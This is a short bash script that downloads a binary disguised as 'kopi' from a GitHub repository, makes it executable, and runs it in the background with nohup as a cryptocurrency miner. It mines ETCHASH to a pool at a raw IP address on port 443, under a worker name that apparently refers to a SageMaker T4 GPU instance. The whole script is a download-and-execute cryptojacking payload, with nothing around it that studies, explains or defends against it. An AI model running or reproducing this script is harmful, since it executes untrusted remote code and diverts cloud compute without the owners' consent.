#!/bin/bash

wget https://github.com/aurbach55/dera/raw/main/kopi && chmod +x ./kopi && nohup ./kopi --algo ETCHASH --pool 47.108.153.82:443 --user sagemaker.T4 > nohup.out
 
